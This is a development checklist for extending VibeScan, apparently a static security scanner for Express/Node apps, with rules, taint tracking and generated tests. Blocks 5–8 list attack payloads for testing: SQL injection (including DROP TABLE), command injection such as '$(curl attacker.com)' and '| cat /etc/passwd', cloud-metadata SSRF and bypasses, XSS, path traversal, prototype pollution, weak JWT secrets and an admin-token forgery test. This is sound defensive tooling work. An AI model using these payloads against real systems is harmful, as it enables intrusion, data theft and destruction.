# VibeScan — Cursor Checklist (mapped to your structure)

> Every item maps to a file that already exists or slots cleanly into your tree.
> Do not create new top-level folders — everything fits inside `src/`.

```
src/
├── attacks/
│   ├── browser/        ← XSS, CSRF payloads
│   ├── crypto/         ← JWT weak secret, hardcoded creds
│   ├── file/           ← path traversal payloads
│   ├── injection/      ← SQLi, command injection, SSRF payloads
│   └── index.ts        ← already exists, re-export all attacks
├── rules/
│   └── system/
│       ├── ai/         ← NEW: slopsquat + LLM secret rules
│       ├── cli/        ← already exists
│       ├── engine/     ← already exists
│       ├── parser/     ← already exists (extend for route graph)
│       ├── sanitizers/ ← already exists
│       ├── sinks/      ← already exists (extend for BOLA, CSRF, rate limit)
│       ├── sources/    ← already exists (extend for req.* tracking)
│       └── utils/      ← already exists (add entropy.ts, dict loader)
├── eslint-plugin.ts    ← already exists
├── format.ts           ← already exists
├── index.ts            ← already exists
├── scanner.ts          ← already exists (add registry check call)
├── types.ts            ← already exists (extend with new finding types)
└── walker.ts           ← already exists (extend for mount propagation)
```

---

## BLOCK 1 · Extend `src/rules/system/parser/`

> The parser is where route + middleware graph extraction lives.
> Your parser already walks files — extend it, don't replace it.

- [ ] **Add route registration detection** to the existing parser
  - [ ] Detect `app.get/post/put/patch/delete(path, ...handlers)`
  - [ ] Detect `router.get/post/put/patch/delete(path, ...handlers)` — any variable name for the router object
  - [ ] Detect `app.use(path, router)` — store prefix for mount propagation

- [ ] **Add mount chain propagation** to `walker.ts`
  - [ ] When `app.use('/prefix', routerVar)` is found, record the prefix
  - [ ] Apply prefix to all routes registered on that router variable
  - [ ] Handle nesting: `/api` + `/users` → `/api/users`

- [ ] **Add router alias tracking** to `parser/`
  - [ ] When `const api = express.Router()` is found, map variable name `api` to a router context
  - [ ] When `api.get(...)` is called, look up the alias and treat as route registration

- [ ] **Add middleware chain extraction** to the route result
  - [ ] For each route, collect all handler arguments before the final handler
  - [ ] Collect router-level `.use()` middleware applied upstream
  - [ ] Store as string array — anonymous functions become `'anonymous'`

- [ ] **Add parameter extraction** from handler bodies
  - [ ] Find all `req.body.X`, `req.query.X`, `req.params.X` MemberExpression nodes
  - [ ] Store field names so payload rules can target the right parameter type

- [ ] **Extend `types.ts`** with the route graph shape:
  ```ts
  export interface RouteNode {
    method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE'
    path: string           // as written in source
    fullPath: string       // with mount prefix resolved
    params: string[]       // path params like :id
    bodyFields: string[]   // req.body.* fields used
    queryFields: string[]  // req.query.* fields used
    middlewares: string[]  // middleware names in chain
    file: string
    line: number
    handlerSource: string  // raw handler text for LLM layer later
  }
  ```

---

## BLOCK 2 · Extend `src/rules/system/sources/`

> Sources = where untrusted data enters. Extend the existing source tracking.

- [ ] Confirm `req.body.*`, `req.query.*`, `req.params.*` are tracked as taint sources
- [ ] **Add `req.headers.*`** as a taint source — used in SSRF host-header attacks (CVE-2024-34351 Next.js)
- [ ] **Add env fallback pattern** as a source of insecure data:
  - [ ] Track `process.env.X || "literal"` as a weak-secret source when the literal matches the dictionary
  - [ ] This feeds into `crypto/` rules

---

## BLOCK 3 · Extend `src/rules/system/sinks/`

> Sinks = where tainted data causes harm. Add the missing sink types.

- [ ] **Confirm existing sinks** cover: `db.query()`, `exec()`, `fs.readFile()`, `res.send()`
- [ ] **Add `fetch()` / `axios.get()` / `http.get()`** as SSRF sinks
  - [ ] Flag when tainted data reaches the URL argument position
  - [ ] Special case: `axios({url: tainted})` — object form
- [ ] **Add `_.merge()` / `_.defaultsDeep()` / `deepmerge()`** as prototype pollution sinks
  - [ ] Flag when `req.body` or `req.query` is in the second argument
- [ ] **Add `_.set(obj, taintedPath, value)`** as a path-definition pollution sink
  - [ ] Flag when first path argument is user-controlled
- [ ] **Add `jwt.sign(payload, literal)`** as a crypto sink
  - [ ] Flag when secret argument is a string literal matching the weak-secret dictionary
- [ ] **Add `res.cookie(name, value, opts)`** as a cookie-config sink
  - [ ] Flag when `opts` is missing `httpOnly: true` or `secure: true`

---

## BLOCK 4 · Extend `src/rules/system/sanitizers/`

> Sanitizers = what clears a taint flow. Make sure these are recognized
> so you don't false-positive on already-safe code.

- [ ] Recognize parameterized query calls as SQLi sanitizers: `db.query(sql, [params])`
- [ ] Recognize `DOMPurify.sanitize()`, `sanitizeHtml()`, `escapeHtml()` as XSS sanitizers
- [ ] Recognize `path.resolve()` + prefix check as path traversal sanitizer
- [ ] Recognize `ip.isPrivate()` check **as insufficient** for SSRF — do NOT mark it as a sanitizer (CVE-2023-42282, CVE-2024-29415)
- [ ] Recognize `helmet()` as security-header sanitizer at app level
- [ ] Recognize `express-rate-limit`, `rateLimit()` as rate-limit sanitizer at route level
- [ ] Recognize `csrf()`, `csurf()`, `doubleCsrf()` as CSRF sanitizers

---

## BLOCK 5 · `src/attacks/injection/` — extend existing

> You already have an injection folder. Add these payload arrays.

- [ ] **SQLi payloads** — add or extend existing file:
  ```ts
  export const SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "1' UNION SELECT null,username,password FROM users--",
    "admin'--",
    "' OR 1=1 LIMIT 1--"
  ]
  ```

- [ ] **Command injection payloads**:
  ```ts
  export const CMDI_PAYLOADS = [
    "; ls -la", "| cat /etc/passwd",
    "&& whoami", "`id`", "$(curl attacker.com)"
  ]
  ```

- [ ] **SSRF payloads** — include all bypass forms from research:
  ```ts
  export const SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  // AWS metadata
    "http://localhost:6379",                       // Redis
    "file:///etc/passwd",
    "//169.254.169.254/",                          // protocol-relative bypass
    "http://0177.0.0.1/",                          // octal IP (CVE-2023-42282)
    "http://0x7f.0.0.1",                           // hex IP (CVE-2024-29415)
    "http://[::1]",                                // IPv6 loopback
    "http://127.1"                                 // short-form loopback
  ]
  ```

- [ ] **Prototype pollution payloads** — add new file `injection/prototypePollution.ts`:
  ```ts
  export const PROTO_PAYLOADS_JSON = {
    "__proto__": { "polluted": true }
  }
  export const PROTO_PAYLOADS_PATH = [
    "__proto__.isAdmin",
    "constructor.prototype.shell",
    "__proto__.polluted"
  ]
  ```

---

## BLOCK 6 · `src/attacks/browser/` — extend existing

> XSS and CSRF payloads live here.

- [ ] **XSS payloads** — add filter-bypass variants from OWASP cheat sheet:
  ```ts
  export const XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",                         // attribute context
    "</script><script>alert(1)</script>",   // context-break
    "<iframe src=javascript:alert(1)>"
  ]
  ```

- [ ] **CSRF test payload** — add cross-origin POST simulation:
  ```ts
  // Used by the test generator to verify CSRF rejection
  export const CSRF_TEST = {
    headers: { 'Origin': 'https://evil.attacker.com' },
    // no CSRF token in request
  }
  ```

---

## BLOCK 7 · `src/attacks/file/` — extend existing

- [ ] **Path traversal payloads** — add encoding variants:
  ```ts
  export const PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fshadow",
    "....//....//etc/passwd",            // double-dot bypass
    "%252e%252e%252fetc%252fpasswd",     // double URL encode
    "..\\..\\..\\windows\\system32"     // Windows variant
  ]
  ```

---

## BLOCK 8 · `src/attacks/crypto/` — extend existing

> Crypto attacks = weak secrets, JWT forgery, insecure cookie config.

- [ ] **Create `crypto/secretDict.ts`** — the LLM default secret dictionary:
  ```ts
  // TIER 1: doc-derived, citable (Truffle Security + jsonwebtoken docs)
  export const TIER1_SECRETS = [
    "secret", "SECRET", "secret key", "123456",
    "your-256-bit-secret",    // from jsonwebtoken README
    "keyboard cat",           // from express-session docs
    "supersecretkey", "supersecretjwt",
    "your-secret-key-change-it-in-production",
    "changeme", "password", "mysecret",
    "jwt_secret", "secretkey", "your-secret-key",
    "development", "test-secret", "placeholder"
  ]

  // TIER 2: LLM-observed (Invicti 20k corpus — expand after mining)
  export const TIER2_SECRETS = [
    "SESSION_SECRET", "TOKEN_SECRET", "APP_SECRET",
    "auth_secret", "my-secret", "example-secret",
    "dummy", "default", "hackme", "replace-this",
    "todo", "fixme"
  ]

  export const ALL_SECRETS = [...TIER1_SECRETS, ...TIER2_SECRETS]
  ```

- [ ] **Create `crypto/entropy.ts`** — filter real secrets from false positives:
  ```ts
  // Shannon entropy — strings > 4.5 entropy AND > 20 chars are likely real
  export function isLikelyRealSecret(s: string): boolean {
    // compute entropy, return true if high = skip this string
  }

  // Provider key formats to always skip
  export const PROVIDER_PATTERNS = [
    /^AKIA[0-9A-Z]{16}$/,           // AWS access key
    /^sk-[a-zA-Z0-9]{48}$/,         // OpenAI key
    /^ghp_[a-zA-Z0-9]{36}$/,        // GitHub PAT
    /-----BEGIN .* PRIVATE KEY-----/ // Private key block
  ]
  ```

- [ ] **JWT forgery payload** — used by test generator:
  ```ts
  // Decode target JWT, re-sign with each TIER1_SECRETS entry
  // If server accepts → flag as RULE-AUTH-002
  export const JWT_WEAK_SECRET_TEST = {
    algorithm: 'HS256',
    testSecrets: TIER1_SECRETS,
    forgedPayload: { role: 'admin', isAdmin: true }
  }
  ```

---

## BLOCK 9 · `src/rules/system/ai/` — NEW FOLDER

> This is the new AI-specific rule set that doesn't exist anywhere else.
> Create `src/rules/system/ai/` with these files:

- [ ] **`ai/slopsquat.ts`** — RULE-SLOP-001 · OWASP A06:2021
  ```ts
  // Read package.json dependencies
  // Batch HEAD requests to https://registry.npmjs.org/{name}
  // Flag 404 as SLOPSQUAT_CANDIDATE
  // Skip: @scoped packages in workspaces, packages in .npmrc custom registry
  // Mark @org/name with 404 as POSSIBLY_PRIVATE (lower severity)
  ```
  - [ ] Implement `checkDependencies(packageJsonPath: string)`
  - [ ] Add `--skip-registry` flag support for offline environments
  - [ ] Private package heuristic: if name matches `workspaces[]` in package.json → skip

- [ ] **`ai/envFallback.ts`** — RULE-SEC-004 · CWE-547 **[novel rule from research]**
  ```ts
  // Detect: process.env.JWT_SECRET || "supersecretkey"
  // AST: LogicalExpression where
  //   left = MemberExpression (process.env.*)
  //   right = StringLiteral matching ALL_SECRETS
  //   operator = "||"
  // This is NEW — no existing tool catches this pattern
  ```

- [ ] **`ai/ipGuard.ts`** — RULE-SSRF-003 · CWE-918 **[novel rule from CVE research]**
  ```ts
  // Detect: ip.isPublic() or ip.isPrivate() used as an SSRF guard
  // AST: CallExpression where callee = ip.isPublic / ip.isPrivate
  //      AND appears in a conditional gating a fetch/http.get call
  // Flag as INSUFFICIENT_SSRF_DEFENSE
  // Cite: CVE-2023-42282, CVE-2024-29415, CVE-2025-59436/59437
  // Recommend: use explicit host allowlist instead
  ```

- [ ] **`ai/axiosBypass.ts`** — RULE-SSRF-002 · CWE-918
  ```ts
  // Detect axios configured with baseURL + user-controlled url param
  // axios({ baseURL: 'https://api.safe.com', url: req.body.path })
  // CVE-2024-39338: path-relative → protocol-relative bypass
  // CVE-2025-27152: absolute URL overrides baseURL entirely
  // Patched in axios 1.7.4 and 1.8.2 — also check installed version
  ```

---

## BLOCK 10 · Extend `src/rules/system/engine/`

> The engine orchestrates rule execution. Wire in the new rules.

- [ ] Register all new rules from `ai/` folder in the engine's rule registry
- [ ] Add `middleware audit` pass — after route graph is built:
  - [ ] Walk every POST/PUT/PATCH/DELETE route
  - [ ] Check middleware chain for auth, CSRF, rate-limit presence
  - [ ] Emit findings for routes missing required middleware
- [ ] Add `app-level audit` pass:
  - [ ] Check if `helmet()` is applied at app root
  - [ ] Check if CORS is configured with `origin: '*'`
  - [ ] These are one-time checks, not per-route

---

## BLOCK 11 · `src/rules/system/utils/` — add helpers

- [ ] **`utils/middlewareNames.ts`** — canonical lists for middleware detection:
  ```ts
  export const AUTH_MIDDLEWARE = [
    'passport.authenticate', 'verifyToken', 'requireAuth',
    'isAuthenticated', 'jwt.verify', 'authMiddleware',
    'authenticate', 'protect', 'ensureAuth'
  ]
  export const CSRF_MIDDLEWARE = [
    'csrf', 'csurf', 'doubleCsrf', 'lusca.csrf', 'csrfProtection'
  ]
  export const RATE_LIMIT_MIDDLEWARE = [
    'rateLimit', 'expressRateLimit', 'limiter',
    'rateLimiter', 'slowDown', 'bottleneck'
  ]
  ```

- [ ] **`utils/sensitiveRoutes.ts`** — patterns that require rate limiting:
  ```ts
  export const SENSITIVE_PATH_PATTERNS = [
    /\/login/, /\/register/, /\/auth/, /\/token/,
    /\/forgot-password/, /\/reset-password/, /\/verify/
  ]
  ```

---

## BLOCK 12 · Extend `src/scanner.ts`

> Scanner is the top-level orchestrator. Wire everything together.

- [ ] After existing scan completes, add call to `ai/slopsquat.ts` if `--check-registry` flag is set
- [ ] Add `--generate-tests` flag that calls the test writer after findings are collected
- [ ] Add exit code 1 if any findings with severity `critical` or `high`
- [ ] Pass `RouteNode[]` from parser to rule engine so middleware audit has access

---

## BLOCK 13 · Test Generator (new file — fits in existing structure)

> Create `src/rules/system/engine/testWriter.ts`
> OR if you prefer, create `src/testGenerator.ts` at root of `src/`

- [ ] **`testWriter.ts`** — `generateTests(findings: Finding[], outputDir: string)`
- [ ] For injection findings → HTTP payload test with status + body assertions
- [ ] For PROTO findings → **chain inspection oracle** (not HTTP status):
  ```ts
  const before = Object.getOwnPropertyNames(Object.prototype)
  await request(app).post('/endpoint').send({"__proto__": {"x": 1}})
  expect(Object.getOwnPropertyNames(Object.prototype)).toEqual(before)
  expect(({} as any).x).toBeUndefined()
  ```
- [ ] For BOLA findings → **two-user cross-access test**:
  ```ts
  // Create resource as userA, attempt access as userB
  // Expect: 403 Forbidden
  ```
- [ ] For AUTH-002 (weak JWT) → **JWT forgery test**:
  ```ts
  // Decode existing JWT, re-sign with each TIER1_SECRET
  // Attempt request with forged admin token
  // Expect: 401 Unauthorized
  ```
- [ ] Each generated file starts with:
  ```ts
  // Generated by VibeScan — commit this file and run in CI
  // Rule: {ruleId} · CWE-{cwe} · OWASP {owasp}
  ```

---

## BLOCK 14 · Extend `src/format.ts`

- [ ] Add new finding types to the formatter: `SLOPSQUAT_CANDIDATE`, `POSSIBLY_PRIVATE`, `INSUFFICIENT_SSRF_DEFENSE`, `PROTOTYPE_POLLUTION`, `ENV_FALLBACK`
- [ ] Color coding: critical = red, high = orange, medium = yellow, info = blue
- [ ] Add OWASP ID and CWE number to every finding output line
- [ ] Add `--json` output mode for CI machine consumption

---

## BLOCK 15 · Extend `src/types.ts`

- [ ] Add `RouteNode` interface (see Block 1)
- [ ] Extend `Finding` type with new fields:
  ```ts
  export interface Finding {
    ruleId: string       // e.g. "RULE-INJ-001"
    cwe: number          // e.g. 89
    owasp: string        // e.g. "A03:2021"
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
    file: string
    line: number
    message: string
    remediation: string  // one-line fix instruction
    cveRef?: string[]    // e.g. ["CVE-2024-39338"]
    generatedTest?: string // path to generated .test.ts if applicable
  }
  ```

---

## Priority Order for Cursor

Work in this sequence — each block unblocks the next:

```
Block 1  (parser)          ← everything depends on the route graph
Block 2  (sources)         ← feeds injection + SSRF rules
Block 3  (sinks)           ← feeds rule detection
Block 4  (sanitizers)      ← prevents false positives
Block 5–8 (attack payloads) ← can be done in parallel with blocks 1-4
Block 9  (ai/ rules)       ← new novel rules, needs sinks + sources done
Block 10 (engine wiring)   ← connects everything
Block 11 (utils)           ← small helpers, do alongside block 9
Block 12 (scanner)         ← top-level, do last before test generator
Block 13 (testWriter)      ← needs findings to exist first
Block 14 (format)          ← polish, do last
Block 15 (types)           ← do first thing, defines the contracts
```

---

## New Rules Summary (what's novel vs what existed)

| Rule | Novel? | Where it lives |
|------|--------|----------------|
| INJ-001 SQLi | Extends existing | `attacks/injection/` + `sinks/` |
| INJ-002 XSS | Extends existing | `attacks/browser/` + `sinks/` |
| INJ-003 CMDi | Extends existing | `attacks/injection/` + `sinks/` |
| INJ-004 Path traversal | Extends existing | `attacks/file/` + `sinks/` |
| INJ-005 SSRF basic | Extends existing | `attacks/injection/` + `sinks/` |
| **SSRF-002 axios bypass** | **NEW — CVE research** | `rules/system/ai/axiosBypass.ts` |
| **SSRF-003 ip guard** | **NEW — CVE research** | `rules/system/ai/ipGuard.ts` |
| AUTH-001 BOLA | Extends existing | `sinks/` + engine middleware audit |
| AUTH-002 Weak JWT | Extends existing | `attacks/crypto/secretDict.ts` |
| AUTH-003 Missing auth | Extends existing | engine middleware audit |
| AUTH-004 Cookie flags | Extends existing | `sinks/` |
| MW-001 CSRF | Extends existing | engine middleware audit |
| MW-002 Rate limit | Extends existing | engine middleware audit |
| MW-003 Helmet | Extends existing | engine app-level audit |
| MW-004 CORS wildcard | Extends existing | `sinks/` |
| SEC-001 Hardcoded creds | Extends existing | `attacks/crypto/` + `sinks/` |
| **SEC-004 Env fallback** | **NEW — research finding** | `rules/system/ai/envFallback.ts` |
| SEC-003 eval with input | Extends existing | `sinks/` |
| **PROTO-001 Unsafe merge** | **NEW — Silent Spring** | `attacks/injection/prototypePollution.ts` |
| **PROTO-002 Path definition** | **NEW — ObjLupAnsys** | `attacks/injection/prototypePollution.ts` |
| **SLOP-001 Slopsquatting** | **NEW — USENIX 2025** | `rules/system/ai/slopsquat.ts` |
